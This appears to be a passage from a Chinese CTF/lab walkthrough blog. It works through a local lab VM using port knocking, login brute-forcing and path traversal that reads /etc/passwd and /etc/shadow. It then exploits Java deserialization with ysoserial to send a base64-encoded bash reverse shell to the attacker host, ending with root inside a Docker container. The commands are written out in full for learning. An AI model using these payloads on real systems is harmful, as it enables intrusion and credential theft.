      const input = document.createElement('input');
      input.type = 'text';
      input.autofocus = true;

      line.appendChild(promptSpan);
      line.appendChild(input);
      terminal.appendChild(line);

      input.focus();

      input.addEventListener('keydown', (e) =&gt; {
        if (e.key === 'Enter') {
          const value = input.value.trim();
          input.disabled = true;
          runCommand(value);
        } else if (e.key === 'ArrowUp') {
          if (historyIndex &gt; 0) {
            historyIndex--;
            input.value = history[historyIndex];
          }
        } else if (e.key === 'ArrowDown') {
          if (historyIndex &lt; history.length - 1) {
            historyIndex++;
            input.value = history[historyIndex];
          } else {
            input.value = '';
          }
        }
      });
    }

    function runCommand(input) {
      const prompt = renderPrompt();
      if (input !== '') {
        history.push(input);
        historyIndex = history.length;
      }

      function escapeHTML(str) {
            return str.replace(/&amp;/g, '&amp;amp;').replace(/&lt;/g, '&amp;lt;').replace(/&gt;/g, '&amp;gt;');
    }

      const args = input.split(' ');
      const cmd = args[0];
      const param = args.slice(1);
      const currentDir = getDir(currentPath, fileSystem);
      let output = '';

      switch (cmd) {
        case 'help':
          output = '命令: help, clear, echo, ls, cd, cat, date';
          break;
        case 'clear':
          terminal.innerHTML = '';
          createInputLine();
          return;
        case 'echo':
          output = param.join(' ');
          break;
        case 'date':
          output = new Date().toString();
          break;
        case 'ls':
          if (currentDir) {
            output = Object.keys(currentDir).join('  ');
          } else {
            output = '无法访问当前目录';
          }
          break;
        case 'cd':
          if (param.length === 0 || param[0] === '~') {
            currentPath = ['home', 'user'];
          } else if (param[0] === '..') {
            if (currentPath.length &gt; 0) currentPath.pop();
          } else {
            const target = param[0];
            const newPath = [...currentPath, target];
            const targetDir = getDir(newPath, fileSystem);
            if (targetDir &amp;&amp; typeof targetDir === 'object') {
              currentPath = newPath;
            } else {
              output = `cd: 没有这个目录: ${target}`;
            }
          }
          break;
        case 'cat':
          if (param.length === 0) {
            output = 'cat: 需要文件名参数';
          } else {
            const file = param[0];
            if (currentDir[file] &amp;&amp; typeof currentDir[file] === 'string') {
              output = escapeHTML(currentDir[file]);
            } else {
              output = `cat: 找不到文件 ${file}`;
            }
          }
          break;
        case '':
          output = '';
          break;
        default:
          output = `未找到命令: ${cmd}`;
      }

      printOutput(prompt, input, output);
      createInputLine();
      terminal.scrollTop = terminal.scrollHeight;
    }

    // 初始化
    createInputLine();
    terminal.addEventListener('click', () =&gt; {
      const inputs = terminal.querySelectorAll('input');
      if (inputs.length &gt; 0) inputs[inputs.length - 1].focus();
    });
  &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;

```

扒拉的时候看到了一个文件/opt/code/test.c，处理一下就下面那样

```
#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;

int main()
{
        srand(114514); 
        for(int i = 0; i &lt; 114514; i++)
        {
                rand();
        }
        printf('%d\\n',rand()%65535);

        printf('%d\\n',rand()%65535);

        printf('%d\\n',rand()%65535);


        return 0;
}
```

假随机数

&gt; **伪随机数**
&gt;
&gt; 计算机生成的随机数通常是伪随机的，它们由一个初始的“种子”（seed）通过特定算法生成。如果种子固定，那么后续生成的“随机”数序列也是完全固定和可预测的。

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nano test.c
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat test.c 
#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;

int main()
{
        srand(114514); 
        for(int i = 0; i &lt; 114514; i++)
        {
                rand();
        }
        printf('%d\\n',rand()%65535);

        printf('%d\\n',rand()%65535);

        printf('%d\\n',rand()%65535);


        return 0;
}
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ gcc test.c -o test
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ./test     
6440\n17226\n31925\n                                                             
```

看到这三个数大概猜到要干嘛了，敲门

&gt; **端口敲门（Port Knocking）**
&gt;
&gt; 这是一种通过向目标主机预先定义好的一系列端口发送请求（“敲门”），来动态开启某个特定服务端口的安全机制。

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ knock 192.168.205.131 6440 17226 31925
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ knock 192.168.205.131 6440 17226 31925
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ knock 192.168.205.131 6440 17226 31925        
```

敲门程序有概率抽风，所以多敲几次

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -p- 192.168.205.131              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 08:11 EDT
Nmap scan report for 192.168.205.131
Host is up (0.00065s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 08:00:27:0F:FA:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.06 seconds                     
```

8080开了，去看一下

## 三、Web应用渗透：从LFI到RCE

![image-20250627201136754](https://7r1umphk.github.io/image/image20250627201136940.webp)

### 3.1 弱口令爆破与认证绕过

登录，尝试弱密码

![image-20250627201201451](https://7r1umphk.github.io/image/image20250627201201647.webp)

登不上，但是看到一个貌似可以注入的地方，看看源码先

```
&lt;!DOCTYPE html&gt;
&lt;html lang='zh-CN'&gt;
&lt;head&gt;
    &lt;meta charset='UTF-8'&gt;
    &lt;title&gt;用户登录&lt;/title&gt;
    &lt;style&gt;
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(to right, #74ebd5, #ACB6E5);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            width: 300px;
        }

        .login-container h2 {
            text-align: center;
            margin-bottom: 24px;
            color: #333;
        }

        .login-container input[type='text'],
        .login-container input[type='password'] {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 8px;
            box-sizing: border-box;
        }

        .login-container input[type='submit'] {
            width: 100%;
            padding: 12px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
        }

        .login-container input[type='submit']:hover {
            background-color: #45a049;
        }

        .message {
            color: red;
            text-align: center;
            margin-top: 10px;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div class='login-container'&gt;
    &lt;h2&gt;登录&lt;/h2&gt;
    &lt;form method='post' action='/login'&gt;
        &lt;input type='text' name='username' placeholder='用户名' required&gt;
        &lt;input type='password' name='password' placeholder='密码' required&gt;
        &lt;input type='submit' value='登录'&gt;
    &lt;/form&gt;
    &lt;div class='message'&gt;
        &lt;!-- 后端可以通过重定向参数显示失败信息 --&gt;
        &lt;span id='error-message'&gt;&lt;/span&gt;
    &lt;/div&gt;
&lt;/div&gt;
&lt;script&gt;
    const urlParams = new URLSearchParams(window.location.search);
    const error = urlParams.get('error');
    if (error) {
        document.getElementById('error-message').innerText = decodeURIComponent(error);
    }
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;

```

假的，本地实现的，不然error可以测试一下{{7*7}}模板注入

爆破一下目录

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/download                                                                                   
{'timestamp':'2025-06-27T12:14:39.104+0000','status':400,'error':'Bad Request','message':'Required String parameter 'file' is not present','path':'/download'}                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 'http://192.168.205.131:8080/download?file=../../../etc/passwd'
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 'http://192.168.205.131:8080/download?file=....//....//....//etc/passwd'
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 'http://192.168.205.131:8080/download?file=php://filter/read=convert.base64-encode/resource=../../../etc/passwd'
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 'http://192.168.205.131:8080/download?file=download'                                                            
&lt;h1&gt;Forbidden access                                                                                                                                             ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.131:8080/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd'
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.131:8080/download?file=..%5c..%5c..%5cetc/passwd'
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.131:8080/download?file=a/../../../../etc/passwd'
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.131:8080/download?file=file:///etc/passwd'
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.131:8080/download?file=../../../../etc/passwd%00.jpg'
&lt;h1&gt;Forbidden access                                                                                                                    
```

应该是少参数，暂时搁置

绕过不了，继续看其他的

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/error                                                                    
{'timestamp':'2025-06-27T12:16:49.948+0000','status':999,'error':'None','message':'No message available'}                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/login
{'timestamp':'2025-06-27T12:16:58.321+0000','status':405,'error':'Method Not Allowed','message':'Request method 'GET' not supported','path':'/login'}                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/login -X POST
{'timestamp':'2025-06-27T12:17:20.707+0000','status':400,'error':'Bad Request','message':'Required String parameter 'username' is not present','path':'/login'}                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/test/        
    \&lt;h1&gt;Website is under development.......                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ trans -b :zh 'Website is under development.......' 2&gt;/dev/null
网站正在开发中.......
```

gobuster跑一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ gobuster dir -u http://192.168.205.131:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.131:8080
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 400) [Size: 158]
/login.html           (Status: 200) [Size: 2377]
/login                (Status: 405) [Size: 149]
/test                 (Status: 200) [Size: 39]
/logout               (Status: 302) [Size: 0] [--&gt; http://192.168.205.131:8080/login.html]
/success              (Status: 200) [Size: 47]
/error                (Status: 500) [Size: 105]
```

多了一个logout但是是跳转

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/logout -v                       
*   Trying 192.168.205.131:8080...
* Connected to 192.168.205.131 (192.168.205.131) port 8080
* using HTTP/1.x
&gt; GET /logout HTTP/1.1
&gt; Host: 192.168.205.131:8080
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 302 
&lt; Set-Cookie: auth=; Max-Age=0; Expires=Thu, 01-Jan-1970 00:00:10 GMT; Path=/; HttpOnly
&lt; Location: http://192.168.205.131:8080/login.html
&lt; Content-Length: 0
&lt; Date: Fri, 27 Jun 2025 12:27:05 GMT
&lt; 
* Connection #0 to host 192.168.205.131 left intact
```

nuclei扫描一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nuclei -u http://192.168.205.131:8080
Generated code
__     _
Use code with caution.
____  __  / /  ()
/ __ / / / / / / _ / /
/ / / / // / // /  __/ /
// //_,/_/_/_/_/   v3.4.5
Generated code
projectdiscovery.io
Use code with caution.
[INF] Your current nuclei-templates  are outdated. Latest is v10.2.3
[INF] Successfully updated nuclei-templates (v10.2.3) to /home/kali/.local/nuclei-templates. GoodLuck!
Nuclei Templates v10.2.3 Changelog
+-------+-------+----------+---------+
| TOTAL | ADDED | MODIFIED | REMOVED |
+-------+-------+----------+---------+
| 11102 | 11102 |        0 |       0 |
+-------+-------+----------+---------+
[INF] Current nuclei version: v3.4.5 (latest)
[INF] Current nuclei-templates version: v10.2.3 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 105
[INF] Templates loaded for current scan: 8086
[INF] Executing 7884 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 202 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1747 (Reduced 1642 Requests)
[INF] Using Interactsh Server: oast.online
[ssh-auth-methods] [javascript] [info] 192.168.205.131:22 ['['publickey','password','keyboard-interactive']']
[ssh-server-enumeration] [javascript] [info] 192.168.205.131:22 ['SSH-2.0-OpenSSH_9.9']
[ssh-password-auth] [javascript] [info] 192.168.205.131:22
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.131:22
[spring-detect] [http] [info] http://192.168.205.131:8080/error
[options-method] [http] [info] http://192.168.205.131:8080 ['GET,HEAD,OPTIONS']
[springboot-actuator:favicon] [http] [info] http://192.168.205.131:8080/favicon.ico
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.131:8080/login.html
[favicon-detect:spring-boot] [http] [info] http://192.168.205.131:8080/favicon.ico ['116323821']
[favicon-detect:Springboot Actuators] [http] [info] http://192.168.205.131:8080/favicon.ico ['116323821']
[favicon-detect:Spring Boot H2 Database] [http] [info] http://192.168.205.131:8080/favicon.ico ['116323821']
[INF] Scan completed in 1m. 21 matches found.
```

看到Spring Boot，所以尝试探测了一下，无果

那去爆破login吧

乱输，burp拦上，放去爆破模块

![image-20250627203233278](https://7r1umphk.github.io/image/image20250627203233435.webp)

用户名

密码扒拉一个rockyou

![image-20250627203358528](https://7r1umphk.github.io/image/image20250627203358895.webp

登录

![image-20250627203459351](https://7r1umphk.github.io/image/image20250627203459633.webp)

源码没啥，那就看一下包

```
GET /success HTTP/1.1
Host: 192.168.205.131:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.205.131:8080/login.html?error=Wrong%20username%20or%20password
Connection: keep-alive
Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

有个cookie，我们刚刚那里也少个参数so

### 3.2 任意文件读取（LFI）

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 'http://192.168.205.131:8080/download?file=../../../etc/passwd' -H 'Cookie:auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI='
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```

可以任意文件读取，但是发现好像没几个用户

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 'http://192.168.205.131:8080/download?file=../../../etc/shadow' -H 'Cookie:auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI='
root:!::0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
postgres:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
                                    
```

看到这就有点怀疑是docker了

因为前面nuclei扫描的时候看到可能是springboot，所以关注一下Java

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 'http://192.168.205.131:8080/download?file=../../../../proc/self/cmdline' -H 'Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' -o cmdline
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    40    0    40    0     0   8188      0 --:--:-- --:--:-- --:--:-- 10000
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat cmdline                                                                 
java-jarjavaserver-0.0.1-SNAPSHOT.jar                                           
```

假设路径是app/java-jarjavaserver-0.0.1-SNAPSHOT.jar

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 'http://192.168.205.131:8080/download?file=../../../../app/java-jarjavaserver-0.0.1-SNAPSHOT.jar' -H 'Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI='
../../../../app/java-jarjavaserver-0.0.1-SNAPSHOT.jar                          
```

啊这，那我不猜了

Linux 的 /proc 文件，可以查看**当前工作目录**

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 'http://192.168.205.131:8080/download?file=../../../../proc/self/cwd' -H 'Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI='
../../../../proc/self/cwd                                                       
```

啊这，那继续猜吧

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 'http://192.168.205.131:8080/download?file=javaserver-0.0.1-SNAPSHOT.jar' -H 'Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' -o app.jar &amp;&amp; ls -l app.jar
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 16.5M    0 16.5M    0     0  12.9M      0 --:--:--  0:00:01 --:--:-- 12.9M
-rwxr-xr-x 1 kali kali 17372545  6月27日 08:51 app.jar
                                                       
```

（要不去买个彩票，哈哈哈）

### 3.3 Java反序列化漏洞利用

拿jd-gui看看

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ jd-gui app.jar

```

![image-20250627205341588](https://7r1umphk.github.io/image/image20250627205341941.webp)

没东西，但是**VulnController.class**

```
// ...
import java.io.ObjectInputStream;
import java.io.ByteArrayInputStream;
// ...

@PostMapping({'/deserialize'})
public String deserialize(@RequestBody byte[] data, HttpServletRequest request) {
    if (!isLoggedIn(request)) // 检查是否已登录
        return '&lt;h2&gt;Error: Unauthorized access';
    try {
        // 危险操作：直接从请求体中读取数据并反序列化
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        Object obj = ois.readObject();
        ois.close();
        return 'Deserialized: ' + obj.toString();
    } catch (Exception e) {
        return 'Error: ' + e.getMessage();
    }
}
```

看他的处理方法......有点像打**反序列化**

&gt; Java反序列化漏洞
&gt;
&gt; 应用接收了来自用户的序列化数据，并在没有进行安全检查的情况下调用 `ObjectInputStream.readObject()` 将其还原为Java对象。如果应用的classpath中存在某些被称为“gadget”的特殊类，攻击者就可以构造恶意的序列化数据。当这些数据被反序列化时，会触发gadget类中的方法，最终导致任意代码执行（RCE）。

![image-20250627205623427](https://7r1umphk.github.io/image/image20250627205623599.webp)

ok，没事了，就是打反序列化

commons-collections-3.2.1.jar这个库，如果了解的话，就知道可以被 ysoserial 工具利用

url:/deserialize

请求方法：POST

if (!isLoggedIn(request)) 必须携带有效的 Cookie

new ObjectInputStream(new ByteArrayInputStream(data));和 ois.readObject();打开房门让你进，不做任何检查，非常的教科书

那拿一下吧

Kali监听一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
```

使用 ysoserial生成反弹 Shell payload

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar 
--2025-06-27 20:21:29--  https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
正在解析主机 github.com (github.com)... 224.0.0.1
正在连接 github.com (github.com)|224.0.0.1|:443... 已连接。
已发出 HTTP 请求，正在等待回应... 302 Found
位置：https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar [跟随至新的 URL]
--2025-06-27 20:21:32--  https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
再次使用存在的到 github.com:443 的连接。
已发出 HTTP 请求，正在等待回应... 302 Found
位置：https://objects.githubusercontent.com/github-production-release-asset-2e65be/29955458/bb6518d9-ffb7-4437-8b6f-db3659467c5c?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=releaseassetproduction%2F20250628%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250628T002132Z&amp;X-Amz-Expires=1800&amp;X-Amz-Signature=6f7e3edd576cb88052588bac5ba19eef49326f73e6dbe5802b878c1f9e6ec3f3&amp;X-Amz-SignedHeaders=host&amp;response-content-disposition=attachment%3B%20filename%3Dysoserial-all.jar&amp;response-content-type=application%2Foctet-stream [跟随至新的 URL]
--2025-06-27 20:21:32--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/29955458/bb6518d9-ffb7-4437-8b6f-db3659467c5c?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=releaseassetproduction%2F20250628%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250628T002132Z&amp;X-Amz-Expires=1800&amp;X-Amz-Signature=6f7e3edd576cb88052588bac5ba19eef49326f73e6dbe5802b878c1f9e6ec3f3&amp;X-Amz-SignedHeaders=host&amp;response-content-disposition=attachment%3B%20filename%3Dysoserial-all.jar&amp;response-content-type=application%2Foctet-stream
正在解析主机 objects.githubusercontent.com (objects.githubusercontent.com)... 224.0.0.2
正在连接 objects.githubusercontent.com (objects.githubusercontent.com)|224.0.0.2|:443... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：59525376 (57M) [application/octet-stream]
正在保存至: “ysoserial-all.jar”

ysoserial-all.jar                            100%[============================================================================================&gt;]  56.77M  17.2MB/s  用时 3.9s    

2025-06-27 20:21:39 (14.6 MB/s) - 已保存 “ysoserial-all.jar” [59525376/59525376])

                                                               
```

生成 payload（可能你的java会有问题，去下载一个Java 8版本的就好了）

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo -n 'bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNS4xMjgvODg4OCAwPiYx
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ java -jar ysoserial-all.jar CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNS4xMjgvODg4OCAwPiYx}|{base64,-d}|{bash,-i}' &gt; payload.bin
```

尝试

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.131:8080/deserialize' -X POST --cookie 'auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' --data-binary @payload.bin                   
{'timestamp':'2025-06-27T13:34:01.451+0000','status':404,'error':'Not Found','message':'No message available','path':'/deserialize'}                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.131:8080/deserialize' -X POST --cookie 'auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' --data-binary @payload.bin -H 'Content-Type:'
{'timestamp':'2025-06-27T13:34:11.493+0000','status':404,'error':'Not Found','message':'No message available','path':'/deserialize'}                   
```

弹回来了

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 45266
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
bash-4.4# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

## 四、横向移动：Docker逃逸与内网穿透

瞄了一下，并且根据之前下载靶机的体量推测是个alpine，所以不稳定shell了

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 45266
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
bash-4.4# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
bash-4.4# ls -la
ls -la
total 16976
drwxr-xr-x    1 root     root          4096 Jun 16 18:16 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
-rw-r--r--    1 root     root      17372545 Jun 16 17:46 javaserver-0.0.1-SNAPSHOT.jar
bash-4.4# cd ..
cd ..
bash-4.4# ls -al
ls -al
total 80
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
-rwxr-xr-x    1 root     root             0 Jun 24 04:20 .dockerenv
drwxr-xr-x    1 root     root          4096 Jun 16 18:16 app
drwxr-xr-x    1 root     root          4096 Jun 16 12:53 bin
drwxr-xr-x    5 root     root           320 Jun 27 08:43 dev
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 etc
drwxr-xr-x    2 root     root          4096 May  9  2019 home
drwxr-xr-x    1 root     root          4096 Jun 16 12:53 lib
drwxr-xr-x    5 root     root          4096 May  9  2019 media
drwxr-xr-x    2 root     root          4096 May  9  2019 mnt
drwxr-xr-x    2 root     root          4096 May  9  2019 opt
dr-xr-xr-x  217 root     root             0 Jun 27 08:43 proc
drwx------    1 root     root          4096 Jun 27 13:28 root
drwxr-xr-x    2 root     root          4096 May  9  2019 run
drwxr-xr-x    1 root     root          4096 Jun 16 12:53 sbin
